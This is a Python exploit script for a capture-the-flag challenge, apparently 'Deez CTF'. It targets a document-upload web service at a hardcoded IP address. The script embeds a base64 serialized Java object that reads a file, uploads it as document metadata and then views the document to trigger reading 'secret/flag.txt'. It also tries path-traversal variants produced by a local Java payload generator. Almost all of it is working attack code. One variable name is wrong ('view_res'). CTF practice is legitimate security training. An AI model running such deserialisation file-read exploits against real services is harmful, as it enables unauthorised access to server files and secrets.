#!/usr/bin/env python3
"""
Test exploit for Deez CTF challenge
"""

import requests
import base64
import json
import re

TARGET = "http://103.31.39.30:8080"

# Payload generated from exploit with proper package name
# Path: secret/flag.txt
payloads = {
    "secret/flag.txt": "rO0ABXNyACFjb20uZG9jeHNoYXJlLnV0aWwuRG9jdW1lbnRSZWFkZXIAAAAAAAAAAQIAAUwABHBhdGh0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAD3NlY3JldC9mbGFnLnR4dA==",
    "../secret/flag.txt": None,  # Will generate if needed
    "/app/secret/flag.txt": None
}

def test_exploit(metadata_b64, path_name):
    """Test the exploit with given payload"""
    print(f"\n[*] Testing path: {path_name}")
    print(f"[*] Payload length: {len(metadata_b64)}")
    
    # Create document payload
    payload = {
        "filename": "exploit.txt",
        "content": base64.b64encode(b"test content").decode(),
        "metadata": metadata_b64
    }
    
    try:
        # Upload document
        print("[*] Uploading document...")
        r = requests.post(f"{TARGET}/api/upload", json=payload, timeout=10)
        
        if r.status_code != 200:
            print(f"[!] Upload failed: {r.status_code}")
            print(f"Response: {r.text[:500]}")
            return False
        
        result = r.json()
        if "viewer" not in result:
            print(f"[!] No viewer URL in response: {result}")
            return False
        
        viewer_url = result["viewer"]
        doc_id = result.get("id", "unknown")
        signature = r.cookies.get("signature")
        
        if not signature:
            print("[!] No signature cookie received")
            return False
        
        print(f"[+] Document uploaded: {doc_id}")
        print(f"[+] Viewer URL: {viewer_url}")
        print(f"[+] Signature: {signature[:20]}...")
        
        # View document (this triggers toString() and file read)
        print("[*] Viewing document (this triggers file read)...")
        view_r = requests.get(f"{TARGET}{viewer_url}", cookies={"signature": signature}, timeout=10)
        
        if view_r.status_code != 200:
            print(f"[!] View failed: {view_res.status_code}")
            print(f"Response: {view_r.text[:500]}")
            return False
        
        # Check for flag
        if "BPJS{" in view_r.text:
            print("\n[+] FLAG FOUND!")
            flag_match = re.search(r'BPJS\{[^}]+\}', view_r.text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n{'='*50}")
                print(f"FLAG: {flag}")
                print(f"{'='*50}\n")
                return True
        else:
            print("[*] No flag found in response")
            # Try to extract metadata section
            if "metadata" in view_r.text.lower():
                # Look for metadata div
                metadata_match = re.search(r'<div[^>]*>.*?<b>Metadata:</b>.*?<span[^>]*>(.*?)</span>', view_r.text, re.DOTALL)
                if metadata_match:
                    print(f"[*] Metadata content: {metadata_match.group(1)[:200]}")
            
            # Save response for debugging
            with open(f"response_{path_name.replace('/', '_')}.html", "w", encoding="utf-8") as f:
                f.write(view_r.text)
            print(f"[*] Response saved to response_{path_name.replace('/', '_')}.html")
        
        return False
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    print("="*50)
    print("Deez CTF Exploit - DocumentReader File Read")
    print("="*50)
    
    # Test with secret/flag.txt
    success = test_exploit(payloads["secret/flag.txt"], "secret/flag.txt")
    
    if not success:
        print("\n[*] First attempt failed, trying alternative paths...")
        # Generate payloads for other paths if needed
        import subprocess
        import os
        
        for path in ["../secret/flag.txt", "/app/secret/flag.txt"]:
            if path not in payloads or payloads[path] is None:
                print(f"\n[*] Generating payload for: {path}")
                try:
                    result = subprocess.run(
                        ["java", "exploit", path],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        # Extract base64 from output
                        lines = result.stdout.strip().split("\n")
                        for i, line in enumerate(lines):
                            if "Base64 payload:" in line and i + 1 < len(lines):
                                payloads[path] = lines[i + 1].strip()
                                break
                except Exception as e:
                    print(f"[!] Failed to generate payload: {e}")
                    continue
            
            if payloads[path]:
                if test_exploit(payloads[path], path):
                    return

if __name__ == "__main__":
    main()

